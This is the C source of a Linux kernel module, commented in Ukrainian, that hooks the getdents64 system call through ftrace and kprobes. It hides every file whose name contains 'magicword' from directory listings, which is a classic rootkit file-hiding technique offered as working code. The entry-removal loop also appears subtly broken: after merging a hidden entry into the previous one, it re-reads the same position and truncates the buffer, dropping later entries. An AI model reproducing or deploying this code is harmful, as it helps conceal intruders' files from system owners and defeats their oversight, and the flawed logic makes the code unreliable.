#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h> // Додано для kprobes
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("OK");
MODULE_DESCRIPTION("A module to hide files with 'magicword' in their name using ftrace");

#define MAGIC_WORD "magicword"

// Використовуємо правильне ім'я символу для x86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define SYSCALL_NAME "__x64_sys_getdents64"
#else
#define SYSCALL_NAME "sys_getdents64"
#endif


/*
 * Структура для зберігання інформації про перехоплену функцію.
 */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

/*
 * Оголошення прототипу для нашої функції-заміни.
 */
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long hook_getdents64(const struct pt_regs *regs);

/*
 * Визначення хука для sys_getdents64.
 */
static struct ftrace_hook hook = {
    .name = SYSCALL_NAME,
    .function = hook_getdents64,
    .original = &original_getdents64,
};

/*
 * Структура для представлення запису в директорії (відповідає getdents64).
 */
struct linux_dirent64 {
    u64        d_ino;
    s64        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

/*
 * Функція зворотного виклику для ftrace.
 */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (unsigned long)hook->function;
    }
}

/*
 * Функція для встановлення хука.
 */
static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    struct kprobe kp = {
        .symbol_name = hook->name,
    };

    // Використовуємо kprobe для отримання адреси
    err = register_kprobe(&kp);
    if (err < 0) {
        pr_err("register_kprobe failed for %s: %d\n", hook->name, err);
        return err;
    }
    hook->address = (unsigned long)kp.addr;
    unregister_kprobe(&kp);

    *((unsigned long *)hook->original) = hook->address;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

/*
 * Функція для видалення хука.
 */
static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        pr_err("unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        pr_err("ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/*
 * Наша реалізація getdents64, яка фільтрує файли.
 */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent_user = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    char *kbuf = NULL;
    long bpos;
    struct linux_dirent64 *d, *prev_d = NULL;
    long new_ret;

    if (ret <= 0) {
        return ret;
    }

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf) {
        return -ENOMEM;
    }

    if (copy_from_user(kbuf, dirent_user, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }

    new_ret = ret;

    for (bpos = 0; bpos < new_ret;) {
        d = (struct linux_dirent64 *)(kbuf + bpos);
        if (strstr(d->d_name, MAGIC_WORD) != NULL) {
            pr_info("Hiding file: %s\n", d->d_name);
            if (prev_d) {
                // Поглинаємо поточний запис, розширюючи попередній
                prev_d->d_reclen += d->d_reclen;
            } else {
                // Це перший запис, зсуваємо всі наступні дані
                memmove(kbuf, kbuf + d->d_reclen, new_ret - d->d_reclen);
            }
            new_ret -= d->d_reclen;
            // bpos не змінюється, щоб перевірити наступний запис на тому ж місці
            continue;
        }
        prev_d = d;
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirent_user, kbuf, new_ret)) {
        kfree(kbuf);
        return -EFAULT;
    }
    
    kfree(kbuf);
    return new_ret;
}

/*
 * Функція ініціалізації модуля.
 */
static int __init shadow_file_init(void)
{
    int err;
    pr_info("Shadow file module loaded\n");

    err = fh_install_hook(&hook);
    if (err)
        return err;

    return 0;
}

/*
 * Функція виходу з модуля.
 */
static void __exit shadow_file_exit(void)
{
    fh_remove_hook(&hook);
    pr_info("Shadow file module unloaded\n");
}

module_init(shadow_file_init);
module_exit(shadow_file_exit);